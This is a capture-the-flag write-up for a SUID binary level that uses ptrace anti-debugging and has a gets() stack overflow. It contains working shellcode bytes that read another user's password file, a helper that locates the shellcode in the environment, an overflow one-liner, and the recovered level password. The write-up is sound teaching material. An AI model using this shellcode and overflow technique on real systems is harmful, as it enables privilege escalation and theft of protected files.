## Level04

## Binary Analysis

`level04` is a SUID binary owned by `level05`. The binary forks and the child uses `ptrace(PTRACE_TRACEME)` as an anti-debugging measure. The parent watches for suspicious syscalls (notably `execve`) and will terminate the child if the check fails. The vulnerable point is a `gets()`-like buffer read that permits a stack-based overflow.

## Vulnerability

- Anti-debugging via `ptrace` prevents normal debugging techniques.
- The program uses an unsafe input function (e.g., `gets`) allowing a classic buffer overflow.
- Because `execve` usage is monitored, typical `/bin/sh` execve shellcode is not suitable.

## Solution Strategy

Instead of `execve`-based shellcode, use `open`/`read`/`write` shellcode that:

- Opens `/home/users/level05/.pass`
- Reads its contents
- Writes the contents to stdout

This avoids the `execve` syscall and thus bypasses the parent's syscall check.

## Exploitation Steps

1. Place custom shellcode in an environment variable so it resides at a predictable address:

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

2. Determine the runtime address of the environment variable (simple helper program):

```c
/* getenv_addr.c */
#include <stdio.h>
#include <stdlib.h>
int main() { printf("%p\n", getenv("SHELLCODE")); }

/* build: gcc -m32 getenv_addr.c -o getenv_addr */
```

Running `./getenv_addr` returns an address (e.g. `0xffffd89e`).

3. Overflow the buffer with the exact offset to overwrite the return address and point to the shellcode. For this binary the offset is 156 bytes:

```bash
python -c "print 'A' * 156 + '\x9e\xd8\xff\xff'" | ./level04
```

Adjust the little-endian address to whatever `getenv_addr` reports.

## Key Learning

- Anti-debugging can be bypassed by avoiding monitored syscalls.
- Use non-`execve` shellcode (open/read/write) to read files directly.
- Environment variables are a useful vector for placing shellcode at predictable addresses.
- Precise offsets and little-endian formatting are critical for return-address overwrites.

## Result

Successfully retrieved level05 password: `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`